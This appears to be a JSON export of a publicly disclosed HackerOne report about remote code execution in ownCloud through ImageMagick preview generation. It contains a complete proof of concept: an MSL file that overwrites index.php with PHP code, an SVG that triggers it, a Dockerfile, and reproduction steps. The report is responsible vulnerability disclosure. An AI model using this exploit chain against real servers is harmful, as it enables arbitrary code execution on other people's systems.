@@ -1,0 +1,149 @@
+{
+  "id": 1838674,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODM4Njc0",
+  "url": "https://hackerone.com/reports/1838674",
+  "title": "Remote Code Execution on ownCloud instances with ImageMagick installed",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2023-01-18T23:03:43.401Z",
+  "submitted_at": "2023-01-18T23:07:04.547Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukasreschke",
+    "url": "/lukasreschke",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3059,
+    "url": "https://hackerone.com/owncloud",
+    "handle": "owncloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "ownCloud",
+      "twitter_handle": "ownCloud",
+      "website": "https://www.owncloud.com",
+      "about": "ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-12T16:14:15.056Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-03-13T16:14:14.417Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\\Preview\\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))\n\nThe prerequisite for exploitation seem to be:\n\n- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))\n- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)\n- The attacker is able to upload files to the system (e.g. by using [File Drop Folders](https://owncloud.com/features/file-drop-folders/) or having an account)\n\nTo reproduce we have provided the following files:\n\n- F2127559\n```\nFROM owncloud/server:10.11\nRUN apt-get update && apt-get install -y imagemagick\n```\n\n- F2127558\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image> \n  <read filename=\"/mnt/data/files/admin/files/Photos/Portugal.jpg\" />\n  <get width=\"base-width\" height=\"base-height\" />\n  <resize geometry=\"400x400\" />\n  <comment>&lt;?php echo php_uname(); ?&gt;</comment>\n  <write filename=\"/var/www/owncloud/index.php\" />\n</image>\n```\n\n- F2127557\n```\n<svg width=\"1000\" height=\"1000\" \nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">       \n<image xlink:href=\"msl:/mnt/data/files/admin/files/exploit.msl\" height=\"500\" width=\"500\"/>\n</svg>\n```\n\nDownload these files and then perform the following steps:\n\n- Build the docker image\n   - `docker build . -t owncloud-imagemagick`\n- Start the docker image\n   - `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`\n- Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.\n   - Upload the file exploit.msl\n   - Upload the file image.rgb\n- Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)\n\n{F2127565}\n\n## Impact\n\nAttackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2127557,
+      "file_name": "image.rgb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/58851nlj9uk7dwy58dqqj378xges?response-content-disposition=attachment%3B%20filename%3D%22image.rgb%22%3B%20filename%2A%3DUTF-8%27%27image.rgb&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=f490f517262a744146743344bacd2c458dd235310cd7faadea06e06f680d226a",
+      "file_size": 218,
+      "type": "image/svg+xml",
+      "moderated": null
+    },
+    {
+      "id": 2127558,
+      "file_name": "exploit.msl",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hct7smi172dhpi0zsqhq11934kp9?response-content-disposition=attachment%3B%20filename%3D%22exploit.msl%22%3B%20filename%2A%3DUTF-8%27%27exploit.msl&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=ac66b5faee78eb62393df2699a1f26df8ee968c08fe395310ebf729b02a32e1a",
+      "file_size": 307,
+      "type": "application/xml",
+      "moderated": null
+    },
+    {
+      "id": 2127559,
+      "file_name": "Dockerfile",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xoissfqr805tp820lei81ofrwcef?response-content-disposition=attachment%3B%20filename%3D%22Dockerfile%22%3B%20filename%2A%3DUTF-8%27%27Dockerfile&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=8ed7a2e2d6c2a3a72370e3741e46dffbf45b0911e87de63b7a1d5850fe9960e0",
+      "file_size": 80,
+      "type": "application/octet-stream",
+      "moderated": null
+    },
+    {
+      "id": 2127565,
+      "file_name": "Screenshot_2023-01-19_00.05.46.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/slwdvamrj9jmylkcm3nng6th8i4w?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-01-19_00.05.46.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-01-19_00.05.46.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143356Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=f1f6d8971eb6d19b876eacdea759cfeebfacf5738a2116ce77010a40c70a1007",
+      "file_size": 369674,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-04-12T16:14:14.500Z",
+  "allow_singular_disclosure_after": -26518781.94298586,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "shreyaschavhan",
+    "k3rnel_p4nic",
+    "zy9ard3",
+    "shivammusic",
+    "hi_analyst_sarthak",
+    "friskyb"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 468,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "owncloud/core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
